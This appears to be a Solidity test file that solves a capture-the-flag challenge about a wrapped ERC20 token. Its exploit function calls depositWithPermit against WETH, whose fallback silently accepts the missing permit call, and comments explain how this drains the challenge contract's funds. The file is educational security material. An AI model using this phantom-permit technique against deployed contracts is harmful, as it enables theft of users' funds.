// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.10;

import "./utils/BaseTest.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "src/tokens/WrappedERC20Challenge.sol";
import "src/mocks/WETHMock.sol";

contract TestWrappedERC20Challenge is BaseTest {
    WrappedERC20Challenge private challenge;
    WrappedERC20 private wwETH;
    WETHMock private WETH;

    address private player;

    uint256 constant INITIAL_FUNDS = 10 ether;

    constructor() {
        // Created (during `setUp()`) users will be available in `users` state variable

        string[] memory userLabels = new string[](1);
        userLabels[0] = "Player";
        preSetUp(userLabels.length, 100 ether, userLabels);
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();

        // Deployer create the BankChallenge with some funds, attacker needs to steal them
        challenge = new WrappedERC20Challenge{value: INITIAL_FUNDS}();
        WETH = challenge.WETH();
        wwETH = challenge.wwETH();
        player = users[0];
    }

    function testExploit() public {
        runTest();
    }

    function exploit() internal override {
        vm.startPrank(player);

        // WETH does not implement permit but it does have a fallback function that does call `deposit` by default
        // Calling permit on the `depositWithPermit` that will call `permit` on the underlying `WETH` will not revert
        // because it's not "directly" implemented by `WETH` but will call the `deposit` that will deposit 0 ETH
        // this allows us to deposit to our account taking `target` funds
        wwETH.depositWithPermit(address(challenge), INITIAL_FUNDS / 2, 1, 1, "", "", player);
        wwETH.withdraw();

        vm.stopPrank();
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */
        assertEq(challenge.isSolved(), true);
    }
}
